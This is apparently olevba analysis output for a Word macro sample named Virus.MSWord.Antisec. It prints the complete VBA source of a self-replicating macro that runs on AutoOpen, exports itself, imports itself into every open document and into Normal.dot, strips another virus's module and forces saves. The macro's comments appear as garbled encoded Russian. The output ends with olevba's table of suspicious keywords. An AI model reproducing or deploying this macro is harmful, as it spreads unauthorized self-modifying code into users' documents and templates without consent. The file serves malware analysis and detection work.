olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AntiTheSecond.bas 
in file: Virus.MSWord.Antisec - OLE stream: 'Macros/VBA/AntiTheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
  'ýòî áóäåò ôàéë äëÿ ðàçìíîæåíèÿ àíòèâèðóñà
  doc = 0
  For i = 1 To Documents.Count
    anti = False
    For j = 1 To Documents.Item(i).VBProject.VBComponents.Count
        If Documents.Item(i).VBProject.VBComponents.Item(j).Name = "AntiTheSecond" Then
            anti = True
        End If
    Next j
    If anti Then
        doc = i
    End If
  Next i
  x = Application.StartupPath + "\Anti.tmp"
  If doc > 0 Then
    Documents.Item(doc).VBProject.VBComponents("AntiTheSecond").Export (x)
  Else
    NormalTemplate.VBProject.VBComponents("AntiTheSecond").Export (x)
  End If
    
  'Ïðîáåæèìñÿ ïî âñåì äîêóìåíòàì
  For i = 1 To Documents.Count
    'ïðîâåðèì çàðàæåí ëè äîêóìåíò
    infected = False
    For j = 1 To Documents.Item(i).VBProject.VBComponents.Count
        If Documents.Item(i).VBProject.VBComponents.Item(j).Name = "TheSecond" And Documents.Item(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines Then
            infected = True
        End If
    Next j
    'åñëè çàðàæåí
    If infected Then
       'Ñêàæåì îá ýòîì
       MsgBox ("Îáíàðóæåí âèðóñ The Second â äîêóìåíòå " + Documents.Item(i).Name + "!")
       'óäàëèì ñîäåðæèìîå ìîäóëÿ âèðóñà, à ñàì ìîäóëü îñòàâèì
       '÷òîáû âèðóñ äóìàë ÷òî ôàéë îñòàëñÿ çàðàæåí è íå áóäåò åãî òðîãàòü
       For j = 1 To Documents.Item(i).VBProject.VBComponents("TheSecond").CodeModule.CountOfLines
           Documents.Item(i).VBProject.VBComponents("TheSecond").CodeModule.DeleteLines (1)
       Next j
       'Ñêàæåì ÷òî âûëè÷èëè
       MsgBox ("Äîêóìåíò " + Documents.Item(i).Name + " âûëå÷åí!")
    End If
    'ðàçìíîæèì àíòèâèðóñ
    anti = False
    For j = 1 To Documents.Item(i).VBProject.VBComponents.Count
        If Documents.Item(i).VBProject.VBComponents.Item(j).Name = "AntiTheSecond" Then
            anti = True
        End If
    Next j
    If Not anti Then
        Documents.Item(i).VBProject.VBComponents.import (x)
        MsgBox ("Àíòèâèðóñ äîáàâëåí â äîêóìåíò " + Documents.Item(i).Name + "!!!")
    End If
    'åñëè ÷òî-íèáóäü èçìåíèëè ñîõðàíèì äîêóìåíò
    If Not anti Or infected Then
        Dialogs(wdDialogFileSaveAs).Execute
    End If
  Next i
  
  infected = False
  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(i).Name = "TheSecond" And NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.CountOfLines Then
        infected = True
    End If
  Next i
  If infected Then
    MsgBox ("Îáíàðóæåí âèðóñ The Second â äîêóìåíòå Normal.dot!")
    For j = 1 To NormalTemplate.VBProject.VBComponents("TheSecond").CodeModule.CountOfLines
        NormalTemplate.VBProject.VBComponents("TheSecond").CodeModule.DeleteLines (1)
    Next j
    'Ñêàæåì ÷òî âûëè÷èëè
    MsgBox ("Äîêóìåíò Normal.dot âûëå÷åí!")
  End If
  anti = False
  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(i).Name = "AntiTheSecond" Then
        anti = True
    End If
  Next i
  If Not anti Then
    NormalTemplate.VBProject.VBComponents.import (x)
    MsgBox ("Àíòèâèðóñ äîáàâëåí â äîêóìåíò Normal.dot!")
  End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

